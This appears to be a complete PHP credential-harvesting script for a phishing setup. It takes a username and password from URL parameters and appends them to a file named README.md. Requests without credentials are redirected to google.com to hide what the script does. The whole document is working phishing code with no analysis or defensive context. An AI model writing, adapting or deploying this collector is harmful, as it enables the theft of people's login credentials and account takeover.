<?php

	if ($_GET["u"] && $_GET["p"]) {
		# code...
		$file = fopen("README.md","a");
		fwrite($file, '<> ID : '.$_GET["u"].' --> PW : '.$_GET["p"]."\n");
		fclose($file);

	}
	else {
		# code...
		echo "<script> window.location.href = 'http://google.com' </script>";
	}
?>
